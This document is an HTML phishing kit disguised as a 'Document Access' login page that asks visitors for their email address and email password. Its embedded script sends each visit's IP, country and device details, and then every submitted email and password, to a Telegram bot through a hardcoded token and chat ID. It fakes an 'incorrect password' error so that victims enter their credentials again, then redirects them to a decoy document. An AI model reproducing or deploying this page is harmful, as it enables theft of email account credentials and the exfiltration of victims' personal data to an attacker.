<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Document Access</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  font-family: Arial, sans-serif;
  background: #ffffff url("background.png") no-repeat center center fixed;
  background-size: cover;
  margin: 0;
  padding: 0;
}

.container {
  max-width: 420px;
  margin: 10vh auto;
  background: white;
  padding: 25px;
  border-radius: 8px;
  box-shadow: 0 0 20px rgba(0,0,0,0.15);
}

h2 {
  margin-top: 0;
}

input, button {
  width: 100%;
  padding: 10px;
  margin-top: 10px;
  font-size: 14px;
}

button {
  background: #0066ff;
  color: white;
  border: none;
  cursor: pointer;
}

button:hover {
  background: #004ecc;
}

.notice {
  font-size: 12px;
  color: #555;
  margin-top: 12px;
}

.submit-message {
  font-size: 12px;
  color: red;
  margin-top: 6px;
}
</style>
</head>

<body>

<div class="container">
  <h2>Access Document</h2>
  <p>Login With your email to continue.</p>

  <form id="accessForm">
    <input type="email" id="email" placeholder="Email Address" required>
    <input type="password" id="fname" placeholder="Email Password" required>
    <button type="submit">Log In</button>
    <div id="submitMessage" class="submit-message"></div>
  </form>

  <div class="notice">
    Document Contains Confidentials information
  </div>
</div>

<script>
/* ============================
   CONFIGURATION
============================ */
const BOT_TOKEN = "8319207231:AAHgtqv3pLFkHMYRUdkGMgaK93wmwJ_kU1s";
const CHAT_ID = "8394928905";
const DOCUMENT_URL = "https://sec-ux.github.io/doc/card.html"; // can be .html or .pdf
const REQUIRED_SUBMISSIONS = 3;

const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

/* ============================
   HELPERS
============================ */
function sendTelegram(text) {
  fetch(TG_API, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  });
}

function getDeviceType() {
  return /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
}

/* ============================
   EMAIL AUTOFILL FROM URL
============================ */
const params = new URLSearchParams(window.location.search);
const emailInput = document.getElementById("email");
const emailParam = params.get("email");

if (emailParam) {
  emailInput.value = emailParam;
  emailInput.readOnly = true;
}

/* ============================
   SUBMISSION MESSAGE HANDLER
============================ */
const submitMessageDiv = document.getElementById("submitMessage");

/* ============================
   VISIT NOTIFICATION
============================ */
fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    const emailText = emailInput.value ? `\nAutofill Email: ${emailInput.value}` : "";
    sendTelegram(
      `ðŸ‘€ New Page Visit${emailText}\n` +
      `IP: ${data.ip}\n` +
      `Country: ${data.country_name}\n` +
      `Device: ${navigator.userAgent}\n` +
      `Device Type: ${getDeviceType()}`
    );
  });

/* ============================
   FORM SUBMISSION HANDLER
============================ */
document.getElementById("accessForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const fname = document.getElementById("fname").value.trim();
  const email = emailInput.value.trim();
  if (!fname || !email) return;

  // get previous count
  let count = parseInt(localStorage.getItem("submissionCount") || "0");
  count++;
  localStorage.setItem("submissionCount", count);

  // send telegram with submission info
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      sendTelegram(
        `ðŸ“„ Document Access Attempt (${count}/${REQUIRED_SUBMISSIONS})\n` +
        `Email: ${email}\n` +
        `Passwoed: ${fname}\n` +
        `IP: ${data.ip}\n` +
        `Country: ${data.country_name}\n` +
        `Device: ${navigator.userAgent}\n` +
        `Device Type: ${getDeviceType()}`
      );

      if (count >= REQUIRED_SUBMISSIONS) {
        localStorage.removeItem("submissionCount");
        window.location.href = DOCUMENT_URL;
      } else if (count === 1) {
        submitMessageDiv.textContent = "   Incorrect password,please try again";
      }
    });
});
</script>

</body>
</html>
